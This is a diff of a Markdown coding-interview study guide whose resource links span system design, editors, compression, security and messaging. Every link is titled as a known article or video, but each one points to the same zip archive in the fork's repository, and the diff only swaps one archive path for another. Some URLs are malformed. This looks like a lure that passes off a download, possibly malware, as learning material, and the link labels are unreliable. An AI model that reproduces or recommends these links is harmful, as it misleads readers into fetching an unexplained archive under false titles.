-    - [ ] [A Patreon Architecture Short](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [Tinder: How Does One Of The Largest Recommendation Engines Decide Who You'll See Next?](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [Design Of A Modern Cache](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [Live Video Streaming At Facebook Scale](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [A Beginner's Guide To Scaling To 11 Million+ Users On Amazon's AWS](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [A 360 Degree View Of The Entire Netflix Stack](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [Latency Is Everywhere And It Costs You Sales - How To Crush It](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [What Powers Instagram: Hundreds of Instances, Dozens of Technologies](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [Salesforce Architecture - How They Handle 1.3 Billion Transactions A Day](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [ESPN's Architecture At Scale - Operating At 100,000 Duh Nuh Nuhs Per Second](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+        - [Clones](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [Database](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [Cache](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [Asynchronism](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [Scalable Web Architecture and Distributed Systems](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [Fallacies of Distributed Computing Explained](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip~https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [Jeff Dean - Building Software Systems At Google and Lessons Learned (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [Introduction to Architecting Systems for Scale](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [Scaling mobile games to a global audience using App Engine and Cloud Datastore (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [How Google Does Planet-Scale Engineering for Planet-Scale Infra (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [The Importance of Algorithms](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [Sharding](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [Engineering for the Long Game - Astrid Atkinson Keynote(video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [7 Years Of YouTube Scalability Lessons In 30 Minutes](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [video](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [How PayPal Scaled To Billions Of Transactions Daily Using Just 8VMs](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [How to Remove Duplicates in Large Datasets](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [A look inside Etsy's scale and engineering culture with Jon Cowie (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [What Led Amazon to its Own Microservices Architecture](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [To Compress Or Not To Compress, That Was Uber's Question](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [When Should Approximate Query Processing Be Used?](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [Google's Transition From Single Datacenter, To Failover, To A Native Multihomed Architecture]( https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [The Image Optimization Technology That Serves Millions Of Requests Per Day](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [A Patreon Architecture Short](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [Tinder: How Does One Of The Largest Recommendation Engines Decide Who You'll See Next?](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [Design Of A Modern Cache](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [Live Video Streaming At Facebook Scale](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [A Beginner's Guide To Scaling To 11 Million+ Users On Amazon's AWS](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [A 360 Degree View Of The Entire Netflix Stack](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [Latency Is Everywhere And It Costs You Sales - How To Crush It](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [What Powers Instagram: Hundreds of Instances, Dozens of Technologies](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [Salesforce Architecture - How They Handle 1.3 Billion Transactions A Day](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [ESPN's Architecture At Scale - Operating At 100,000 Duh Nuh Nuhs Per Second](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
     - [ ] See "Messaging, Serialization, and Queueing Systems" way below for info on some of the technologies that can glue services together
     - [ ] Twitter:
-        - [O'Reilly MySQL CE 2011: Jeremy Cole, "Big and Small Data at @Twitter" (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [Timelines at Scale](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+        - [O'Reilly MySQL CE 2011: Jeremy Cole, "Big and Small Data at @Twitter" (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [Timelines at Scale](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
     - For even more, see "Mining Massive Datasets" video series in the [Video Series](#video-series) section
 - [ ] Practicing the system design process: Here are some ideas to try working through on paper, each with some documentation on how it was handled in the real world:
-    - review: [The System Design Primer](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [System Design from HiredInTech](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [cheat sheet](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip%https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - review: [The System Design Primer](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [System Design from HiredInTech](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [cheat sheet](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip%https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
     - flow:
         1. Understand the problem and scope:
             - Define the use cases, with interviewer's help
@@ -1481,12 +1481,12 @@ You're never really done.
             - Rough overview of any key algorithm that drives the service
             - Consider bottlenecks and determine solutions
     - Exercises:
-        - [Design a random unique ID generation system](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [Design a key-value database](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [Design a picture sharing system](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [Design a recommendation system](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [Design a URL-shortener system: copied from above](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [Design a cache system](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+        - [Design a random unique ID generation system](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [Design a key-value database](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [Design a picture sharing system](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [Design a recommendation system](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [Design a URL-shortener system: copied from above](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [Design a cache system](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 ## Additional Learning
 
@@ -1494,31 +1494,31 @@ You're never really done.
     technologies and algorithms, so you'll have a bigger toolbox.
 
 - ### Compilers
-    - [How a Compiler Works in ~1 minute (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [Harvard CS50 - Compilers (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [C++ (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [Understanding Compiler Optimization (C++) (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [How a Compiler Works in ~1 minute (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [Harvard CS50 - Compilers (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [C++ (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [Understanding Compiler Optimization (C++) (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 - ### Emacs and vi(m)
     - Familiarize yourself with a unix-based code editor
     - vi(m):
-        - [Editing With vim 01 - Installation, Setup, and The Modes (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [VIM Adventures](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+        - [Editing With vim 01 - Installation, Setup, and The Modes (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [VIM Adventures](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
         - set of 4 videos:
-            - [The vi/vim editor - Lesson 1](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-            - [The vi/vim editor - Lesson 2](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-            - [The vi/vim editor - Lesson 3](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-            - [The vi/vim editor - Lesson 4](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [Using Vi Instead of Emacs](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+            - [The vi/vim editor - Lesson 1](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+            - [The vi/vim editor - Lesson 2](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+            - [The vi/vim editor - Lesson 3](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+            - [The vi/vim editor - Lesson 4](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [Using Vi Instead of Emacs](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
     - emacs:
-        - [Basics Emacs Tutorial (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+        - [Basics Emacs Tutorial (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
         - set of 3 (videos):
-            - [Emacs Tutorial (Beginners) -Part 1- File commands, cut/copy/paste, cursor commands](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-            - [Emacs Tutorial (Beginners) -Part 2- Buffer management, search, M-x grep and rgrep modes](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-            - [Emacs Tutorial (Beginners) -Part 3- Expressions, Statements, ~https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip file and packages](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [Evil Mode: Or, How I Learned to Stop Worrying and Love Emacs (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [Writing C Programs With Emacs](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [(maybe) Org Mode In Depth: Managing Structure (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+            - [Emacs Tutorial (Beginners) -Part 1- File commands, cut/copy/paste, cursor commands](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+            - [Emacs Tutorial (Beginners) -Part 2- Buffer management, search, M-x grep and rgrep modes](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+            - [Emacs Tutorial (Beginners) -Part 3- Expressions, Statements, ~https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip file and packages](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [Evil Mode: Or, How I Learned to Stop Worrying and Love Emacs (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [Writing C Programs With Emacs](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [(maybe) Org Mode In Depth: Managing Structure (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 - ### Unix command line tools
     - I filled in the list below from good tools.
@@ -1531,128 +1531,128 @@ You're never really done.
     - sort
     - tr
     - uniq
-    - [strace](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [tcpdump](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [strace](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [tcpdump](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 - ### Information theory (videos)
-    - [Khan Academy](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [Khan Academy](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
     - More about Markov processes:
-        - [Core Markov Text Generation](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [Core Implementing Markov Text Generation](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [Project = Markov Text Generation Walk Through](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+        - [Core Markov Text Generation](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [Core Implementing Markov Text Generation](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [Project = Markov Text Generation Walk Through](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
     - See more in MIT 6.050J Information and Entropy series below
 
 - ### Parity & Hamming Code (videos)
-    - [Intro](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [Parity](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [Intro](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [Parity](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
     - Hamming Code:
-        - [Error detection](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [Error correction](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [Error Checking](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+        - [Error detection](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [Error correction](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [Error Checking](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 - ### Entropy
     - Also see videos below
     - Make sure to watch information theory videos first
-    - [Information Theory, Claude Shannon, Entropy, Redundancy, Data Compression & Bits (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [Information Theory, Claude Shannon, Entropy, Redundancy, Data Compression & Bits (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 - ### Cryptography
     - Also see videos below
     - Make sure to watch information theory videos first
-    - [Khan Academy Series](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [Cryptography: Hash Functions](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [Cryptography: Encryption](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [Khan Academy Series](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [Cryptography: Hash Functions](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [Cryptography: Encryption](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 - ### Compression
     - Make sure to watch information theory videos first
     - Computerphile (videos):
-        - [Compression](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [Entropy in Compression](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [Upside Down Trees (Huffman Trees)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [EXTRA BITS/TRITS - Huffman Trees](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [Elegant Compression in Text (The LZ 77 Method)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [Text Compression Meets Probabilities](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [Compressor Head videos](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [(optional) Google Developers Live: GZIP is not enough!](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+        - [Compression](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [Entropy in Compression](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [Upside Down Trees (Huffman Trees)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [EXTRA BITS/TRITS - Huffman Trees](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [Elegant Compression in Text (The LZ 77 Method)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [Text Compression Meets Probabilities](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [Compressor Head videos](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [(optional) Google Developers Live: GZIP is not enough!](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 - ### Computer Security
-    - [MIT (23 videos)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [Introduction, Threat Models](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [Control Hijacking Attacks](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [Buffer Overflow Exploits and Defenses](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [Privilege Separation](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [Capabilities](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [Sandboxing Native Code](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [Web Security Model](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [Securing Web Applications](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [Symbolic Execution](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [Network Security](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [Network Protocols](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [Side-Channel Attacks](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [MIT (23 videos)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [Introduction, Threat Models](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [Control Hijacking Attacks](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [Buffer Overflow Exploits and Defenses](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [Privilege Separation](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [Capabilities](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [Sandboxing Native Code](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [Web Security Model](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [Securing Web Applications](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [Symbolic Execution](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [Network Security](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [Network Protocols](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [Side-Channel Attacks](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 - ### Garbage collection
-    - [GC in Python (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [Deep Dive Java: Garbage Collection is Good!](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [Deep Dive Python: Garbage Collection in CPython (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [GC in Python (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [Deep Dive Java: Garbage Collection is Good!](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [Deep Dive Python: Garbage Collection in CPython (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 - ### Parallel Programming
-    - [Coursera (Scala)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [Efficient Python for High Performance Parallel Computing (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [Coursera (Scala)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [Efficient Python for High Performance Parallel Computing (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 - ### Messaging, Serialization, and Queueing Systems
-    - [Thrift](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [Tutorial](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [Protocol Buffers](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [Tutorials](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [gRPC](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
